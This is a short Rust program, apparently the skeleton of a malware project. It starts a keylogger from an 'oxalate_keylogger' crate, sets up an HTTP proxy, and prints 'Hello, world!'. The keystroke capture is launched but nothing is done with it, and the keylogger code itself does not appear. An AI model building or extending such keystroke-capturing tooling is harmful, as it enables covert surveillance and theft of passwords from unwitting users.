use std::{sync::Arc, time::Duration};

use oxalate_keylogger::spawn_keylogger;
use oxalate_proxy::{HttpProxy, ProxyHttpResponse};

#[tokio::main]
async fn main() {
    let rx = spawn_keylogger();
    let http_proxy = Arc::new(HttpProxy::new(Duration::from_secs(1)));

    println!("Hello, world!");
}
